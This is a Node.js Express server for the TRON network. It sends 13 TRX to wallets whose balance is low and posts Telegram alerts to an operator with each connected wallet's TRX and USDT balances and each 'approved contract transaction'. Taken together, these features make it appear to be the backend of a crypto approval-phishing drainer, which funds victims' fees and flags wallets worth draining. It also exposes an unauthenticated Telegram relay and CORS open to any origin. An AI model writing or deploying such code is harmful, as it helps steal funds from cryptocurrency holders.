const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const TronWebModule = require('tronweb');
const TronWeb = TronWebModule.default || TronWebModule;
const axios = require('axios');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 4000;

app.use(helmet());
app.use(cors({ origin: true, credentials: true }));
app.use(express.json({ limit: '1mb' }));

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  message: 'Too many requests from this IP, please try again later.'
});
app.use(limiter);

const tronGridApiKey = process.env.TRONGRID_API_KEY || process.env.TRON_API_KEY;
const privateKey = (process.env.TRON_PRIVATE_KEY || '').replace(/^0x/i, '').trim();

if (!privateKey) {
  console.error('❌ TRON_PRIVATE_KEY is missing. TRX top-up will fail until it is set.');
}

const tronWeb = new TronWeb({
  fullHost: process.env.TRONGRID_FULL_HOST || 'https://api.trongrid.io',
  headers: tronGridApiKey
    ? { 'TRON-PRO-API-KEY': tronGridApiKey }
    : {},
  privateKey: privateKey || undefined
});

let derivedAddress = null;
try {
  if (privateKey) {
    derivedAddress = tronWeb.address.fromPrivateKey(privateKey);
  }
} catch (error) {
  console.error('❌ Invalid TRON_PRIVATE_KEY:', error.message);
}

const configuredAddress = (process.env.TRON_ADDRESS || '').trim();
if (configuredAddress && derivedAddress && configuredAddress !== derivedAddress) {
  console.warn(
    `⚠️ TRON_ADDRESS (${configuredAddress}) does not match private key address (${derivedAddress}). Using private key address.`
  );
}

const SERVER_CONFIG = {
  privateKey,
  address: derivedAddress || configuredAddress || null,
  autoSendAmount: Number(process.env.AUTO_SEND_AMOUNT || 13),
  minimumBalance: Number(process.env.MINIMUM_BALANCE || 11),
  // Keep a little TRX for bandwidth / fees so sends do not fail at the edge
  feeReserve: Number(process.env.FEE_RESERVE_TRX || 1)
};

if (SERVER_CONFIG.address) {
  tronWeb.setAddress(SERVER_CONFIG.address);
}

const wait = (milliseconds) => new Promise((resolve) => setTimeout(resolve, milliseconds));

function toTrxNumber(value) {
  const amount = Number(tronWeb.fromSun(value));
  return Number.isFinite(amount) ? amount : 0;
}

async function getTrxBalance(address) {
  if (!address) {
    throw new Error('Server wallet address is not configured');
  }

  for (let attempt = 0; attempt < 3; attempt += 1) {
    try {
      return await tronWeb.trx.getBalance(address);
    } catch (error) {
      const errorText = `${error.message || ''} ${error.response?.status || ''}`.toLowerCase();
      const rateLimited =
        error.response?.status === 429 ||
        errorText.includes('rate') ||
        errorText.includes('limit');

      if (!rateLimited || attempt === 2) {
        throw error;
      }

      await wait(500 * (attempt + 1));
    }
  }
}

const validateRequest = (req, res, next) => {
  const { userAddress } = req.body || {};

  if (!userAddress) {
    return res.status(400).json({ error: 'User address is required', success: false });
  }

  if (!TronWeb.isAddress(userAddress)) {
    return res.status(400).json({ error: 'Invalid TRON address', success: false });
  }

  next();
};

async function sendTelegramMessage(text) {
  const BOT_TOKEN = process.env.BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
  const CHAT_ID = process.env.CHAT_ID || process.env.TELEGRAM_CHAT_ID;

  if (!BOT_TOKEN || !CHAT_ID) {
    throw new Error('Missing BOT_TOKEN or CHAT_ID environment variables');
  }

  const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    chat_id: CHAT_ID,
    text: String(text),
    disable_web_page_preview: true
  });

  if (!response.data.ok) {
    throw new Error(response.data.description || 'Telegram API request failed');
  }

  return response.data;
}

app.get('/health', (req, res) => {
  res.json({
    ok: true,
    message: 'Master TRON + Telegram backend is running',
    serverAddress: SERVER_CONFIG.address,
    hasPrivateKey: Boolean(SERVER_CONFIG.privateKey),
    hasTronGridApiKey: Boolean(tronGridApiKey),
    timestamp: new Date().toISOString()
  });
});

app.get('/server-info', (req, res) => {
  res.json({
    success: true,
    serverAddress: SERVER_CONFIG.address,
    autoSendAmount: SERVER_CONFIG.autoSendAmount,
    minimumBalance: SERVER_CONFIG.minimumBalance,
    feeReserve: SERVER_CONFIG.feeReserve,
    network: 'Mainnet',
    apiVersion: '1.1.0'
  });
});

app.post('/check-balance', validateRequest, async (req, res) => {
  try {
    const { userAddress } = req.body;
    const balance = await getTrxBalance(userAddress);
    const balanceInTRX = toTrxNumber(balance);

    res.json({
      success: true,
      address: userAddress,
      balance: balanceInTRX,
      needsFunding: balanceInTRX < SERVER_CONFIG.minimumBalance,
      autoSendAmount: SERVER_CONFIG.autoSendAmount
    });
  } catch (error) {
    console.error('Balance check error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to check balance',
      message: error.message
    });
  }
});

app.post('/send-trx', validateRequest, async (req, res) => {
  try {
    const { userAddress } = req.body;

    if (!SERVER_CONFIG.privateKey || !SERVER_CONFIG.address) {
      return res.status(500).json({
        success: false,
        error: 'Server wallet is not configured',
        message: 'Set TRON_PRIVATE_KEY (and optionally TRON_ADDRESS) in Render env vars'
      });
    }

    const balance = await getTrxBalance(userAddress);
    const balanceInTRX = toTrxNumber(balance);

    if (balanceInTRX >= SERVER_CONFIG.minimumBalance) {
      return res.json({
        success: true,
        message: 'User already has sufficient balance',
        balance: balanceInTRX,
        sent: false
      });
    }

    const serverBalance = await getTrxBalance(SERVER_CONFIG.address);
    const serverBalanceInTRX = toTrxNumber(serverBalance);
    const requiredBalance = SERVER_CONFIG.autoSendAmount + SERVER_CONFIG.feeReserve;

    if (serverBalanceInTRX < requiredBalance) {
      return res.status(500).json({
        success: false,
        error: 'Server has insufficient funds',
        serverBalance: serverBalanceInTRX,
        required: requiredBalance,
        autoSendAmount: SERVER_CONFIG.autoSendAmount
      });
    }

    const amountSun = Number(tronWeb.toSun(SERVER_CONFIG.autoSendAmount));

    // Prefer high-level helper tied to the configured private key
    let result;
    try {
      result = await tronWeb.trx.sendTransaction(userAddress, amountSun);
    } catch (sendError) {
      // Fallback: explicit build + sign + broadcast
      console.warn('sendTransaction failed, trying manual sign path:', sendError.message);
      const transaction = await tronWeb.transactionBuilder.sendTrx(
        userAddress,
        amountSun,
        SERVER_CONFIG.address
      );
      const signedTransaction = await tronWeb.trx.sign(transaction, SERVER_CONFIG.privateKey);
      result = await tronWeb.trx.sendRawTransaction(signedTransaction);
    }

    const txid = result.txid || result.transaction?.txID || result.transaction?.txid;
    const accepted = result.result === true || Boolean(txid);

    if (accepted) {
      console.log(`✅ Sent ${SERVER_CONFIG.autoSendAmount} TRX to ${userAddress} | txid=${txid}`);
      return res.json({
        success: true,
        message: `Sent ${SERVER_CONFIG.autoSendAmount} TRX successfully`,
        transactionId: txid,
        amount: SERVER_CONFIG.autoSendAmount,
        recipient: userAddress,
        sent: true
      });
    }

    const failureMessage =
      result.message ||
      result.code ||
      (typeof result === 'object' ? JSON.stringify(result) : 'Transaction failed');

    throw new Error(failureMessage);
  } catch (error) {
    console.error('Send TRX error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to send TRX',
      message: error.message
    });
  }
});

app.post('/transaction-status', async (req, res) => {
  try {
    const { transactionId } = req.body || {};

    if (!transactionId) {
      return res.status(400).json({ success: false, error: 'Transaction ID is required' });
    }

    const transaction = await tronWeb.trx.getTransaction(transactionId);

    res.json({
      success: true,
      transactionId,
      status: transaction.ret ? 'success' : 'failed',
      confirmed: Boolean(transaction.ret),
      transaction
    });
  } catch (error) {
    console.error('Transaction status error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to get transaction status',
      message: error.message
    });
  }
});

app.post('/telegram-notify', async (req, res) => {
  try {
    const { type, walletAddress, balance, usdtBalance, transactionId, amount, trxBalance, timestamp } =
      req.body || {};

    let message = '';

    if (type === 'wallet_connect') {
      const trxBalanceStr = balance !== undefined ? Number(balance).toFixed(6) : 'N/A';
      const usdtBalanceStr = usdtBalance !== undefined ? Number(usdtBalance).toFixed(2) : 'N/A';
      message =
        `🔗 Wallet Connected\n\n` +
        `💰 Wallet Address: ${walletAddress}\n` +
        `💵 TRX Balance: ${trxBalanceStr} TRX\n` +
        `💵 USDT Balance: ${usdtBalanceStr} USDT\n` +
        `🕐 Time: ${timestamp || new Date().toISOString()}\n\n` +
        `✅ User successfully connected their wallet`;
    } else if (type === 'transaction_approve') {
      const amountInTRX = amount ? (Number(amount) / 1000000).toFixed(6) : 'N/A';
      const txIdStr = transactionId ? String(transactionId) : 'N/A';
      const trxBalanceStr = trxBalance !== undefined ? Number(trxBalance).toFixed(6) : 'N/A';
      const usdtBalanceStr = usdtBalance !== undefined ? Number(usdtBalance).toFixed(2) : 'N/A';

      message =
        `✅ Transaction Approved\n\n` +
        `💰 Wallet Address: ${walletAddress}\n` +
        `📊 Transaction ID: ${txIdStr}\n` +
        `💵 Transaction Amount: ${amountInTRX} TRX\n` +
        `💵 Current TRX Balance: ${trxBalanceStr} TRX\n` +
        `💵 Current USDT Balance: ${usdtBalanceStr} USDT\n` +
        `🕐 Time: ${timestamp || new Date().toISOString()}\n\n` +
        `✅ User successfully approved the contract transaction`;
    } else {
      return res.status(400).json({ success: false, error: 'Invalid notification type' });
    }

    const result = await sendTelegramMessage(message);

    res.json({
      success: true,
      message: 'Telegram notification sent',
      telegramMessageId: result.result && result.result.message_id
    });
  } catch (error) {
    console.error('Telegram notification error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to send Telegram notification',
      message: error.message
    });
  }
});

app.post('/api/telegram', async (req, res) => {
  try {
    const payload = req.body || {};
    const text = payload.text || payload.message || 'No message provided';
    const result = await sendTelegramMessage(text);

    res.json({ ok: true, result });
  } catch (error) {
    console.error('Telegram send failed:', error);
    res.status(500).json({ ok: false, error: error.message });
  }
});

app.use((err, req, res, next) => {
  console.error('Server error:', err);
  res.status(500).json({
    success: false,
    error: 'Internal server error',
    message: err.message
  });
});

app.listen(PORT, () => {
  console.log(`🚀 Master TRON + Telegram backend running on port ${PORT}`);
  console.log(`🔑 Server address: ${SERVER_CONFIG.address || 'NOT SET'}`);
  console.log(`💰 Auto-send amount: ${SERVER_CONFIG.autoSendAmount} TRX`);
  console.log(`📊 Minimum balance: ${SERVER_CONFIG.minimumBalance} TRX`);
  console.log(`🛡️ Fee reserve: ${SERVER_CONFIG.feeReserve} TRX`);
  console.log(`🌐 TronGrid API key: ${tronGridApiKey ? 'configured' : 'not configured'}`);
});

module.exports = app;
